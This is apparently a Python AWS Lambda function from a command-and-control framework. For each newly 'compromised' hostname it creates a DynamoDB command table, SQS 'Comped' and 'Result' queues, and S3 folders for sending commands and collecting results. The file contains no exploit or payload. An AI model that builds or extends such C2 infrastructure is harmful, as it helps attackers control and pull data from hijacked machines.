import json, boto3, os

# This function initializes the very core of the infrastructure so the rest of the commands can function

def lambda_handler(event, context):
    s3 = boto3.client('s3', region_name='us-east-2')
    sqs = boto3.client('sqs')
    dynamo = boto3.client('dynamodb')
    waiter = dynamo.get_waiter('table_exists')
    
    results = []
    listCompExist = False
    listResultExist = False
    s3ResDirExist = False
    s3SendDirExist = False
    bucket = os.environ['BUCKET']

    try:
        jsonEvent = json.loads(event['body'], strict=False)
    # This except has to exist for testing
    except:
        jsonEvent = event
    
    # Check if the host exists and add it if not
    try:
      checkHost = dynamo.list_tables()
      if jsonEvent['hostname'] not in checkHost['TableNames']:
          reponse=dynamo.create_table(
              AttributeDefinitions=[{'AttributeName':'commandTime', 'AttributeType':'N'}, 
                                    {'AttributeName':'command', 'AttributeType':'S'},
                                    {'AttributeName':'sortTime', 'AttributeType':'N'}], 
                TableName=jsonEvent['hostname'],
                KeySchema=[{'AttributeName':'commandTime', 'KeyType':'HASH'}
                           ],
                GlobalSecondaryIndexes = [{
                    'IndexName': 'command-index',
                    'KeySchema': [{
                        'AttributeName':'command',
                        'KeyType': 'HASH'
                    },
                    {
                        'AttributeName':'sortTime',
                        'KeyType':'RANGE'
                    }],
                    'Projection': {
                        'ProjectionType': 'ALL'
                    }
                }],
                BillingMode='PAY_PER_REQUEST')
          results.append('Adding host to database')
          waiter.wait(TableName=jsonEvent['hostname'], WaiterConfig={'Delay': 2})
    except Exception as error:
      return {
        'statusCode': 404,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(str(error))
      }
    
    # Check for the SQS Queue
    response = sqs.list_queues()

    for i in response['QueueUrls']:
        if jsonEvent['hostname'] in i and 'Comped' in i:
            listCompExist = True
            results.append('Host already exists in SQS in Comped')
        if jsonEvent['hostname'] in i and "Result" in i:
            listResultExist = True
            results.append('Host already has a result queue')

    # Create the SQS Queue
    if listCompExist == False:
        try:
            response = sqs.create_queue (
            QueueName=jsonEvent['hostname'] + '-Comped'
            )
            results.append('Created the comp queue')
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }
    
    if listResultExist == False:
        try:
            response = sqs.create_queue (
                QueueName=jsonEvent['hostname'] + '-Result',
                # Attributes = {
                #     'VisibilityTimeout': 60
                # }
            )
            results.append('Created the response queue')
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }

    # Check if the notification.txt exists by waiting for it to error out (this seems to be the best option 🤷‍♂️)
    try:
        s3.get_object (
            Bucket = bucket,
            Key = 'compromised/' + jsonEvent['hostname'] +'/result/notification.txt'
        )
        s3ResDirExist = True
        results.append('Host already exists in bucket')
    except Exception as e:
        if e.response['Error']['Code'] == "404":
            s3ResDirExist = False
    
    try:
        s3.get_object (
            Bucket = bucket,
            Key = 'compromised/' + jsonEvent['hostname'] +'/sendCommand/notification.txt'
        )
        s3SendDirExist = True
        results.append('Host already exists in bucket')
    except Exception as e:
        if e.response['Error']['Code'] == "404":
            s3SendDirExist = False

    # Create the host's directory in seer's S3
    if s3SendDirExist == False:
        try:
            s3.put_object (
                Body = 'This is the init file for the compromised host.',
                Bucket = bucket,
                Key = 'compromised/' + jsonEvent['hostname'] +'/sendCommand/notification.txt'
            )
            results.append('Created the initialized file')
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }
    if s3ResDirExist == False:
        try:
            s3.put_object (
                Body = 'This is the init file for the compromised host.',
                Bucket = bucket,
                Key = 'compromised/' + jsonEvent['hostname'] +'/result/notification.txt'
            )
            results.append('Created the initialized file')
        except Exception as error:
            return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps(str(error))
        }

    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(results)
      }
    
# What is received from Weaver
'''
{
"hostname": "hostname"
}
'''